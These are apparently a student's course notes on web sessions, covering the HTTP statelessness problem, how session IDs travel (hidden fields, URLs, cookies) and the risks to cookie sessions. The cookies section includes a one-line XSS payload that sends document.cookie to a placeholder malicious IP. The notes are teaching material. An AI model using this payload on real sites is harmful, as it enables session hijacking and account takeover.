# General Web info
## Infrastructure
![[Pasted image 20240608192826.png]]
## URL structure
![[Pasted image 20240608192908.png]]
## HTTP sessions
- **Problem**:
	- HTTP is stateless: every request is independent from the previous ones
	- BUT: dynamic web application require the ability to maintain some kind of sessions
- **How to solve it?**
- **Sessions!** 
	- Avoid log-ins in for every requested page 
	- Store user preferences 
	- Keep track of past actions of the user (e.g., shopping cart)

- Implemented by web applications themselves
- Session information are transmitted between the client and the server
- How to transmit session information?
	- **payload HTTP** 
	  `<INPUT TYPE="hidden" NAME="sessionid" VALUE="7456">`
	- **URL**  
	  `http://www.example.com/page.php?sessionid=7456`
	- **header HTTP (e.g., Cookie)** 
	  `GET /page.php HTTP/1.1`
	  `Host: www.example.com`
	  `...`
	  `Cookie: sessionid=7456`
	  `...`

### Cookies
- Data created by the server and memorized by the client 
- Transmitted between client and server using HTTP header
- **Cookies are information that is stored in your browser and which relates to the page you visit.** 
	- For example, you visit a webshop and add something in the shopping cart. When you come back the next day, that cookie will still be set, and you can still see what you have in the shopping cart.
![[Pasted image 20240608193305.png]]

**==But cookies can also be used for massive surveillance.==**
- Or to keep track of your authentication (session cookie). If it is possible to steal a session cookie, then others can gain access to your data.
- E.g.,
  `<script>`
  `document.write('![](http://{MaliciousIpAddress}:8000?cookie='+document.cookie+')’);`
  `</script>`
- **[[cURL]]** is a command-line tool to send Cookies

### Security of cookie sessions
- Critical element (e.g., used for authentication)
- Risk of bypassing authentication schemas!
- Should be considered valid for a small amount of time
- **Attacks**: 
	- hijacking → use SSL/TLS 
	- prediction → use a good PRNG 
	- brute force → increase id length 
	- stealing (XSS) → we'll see...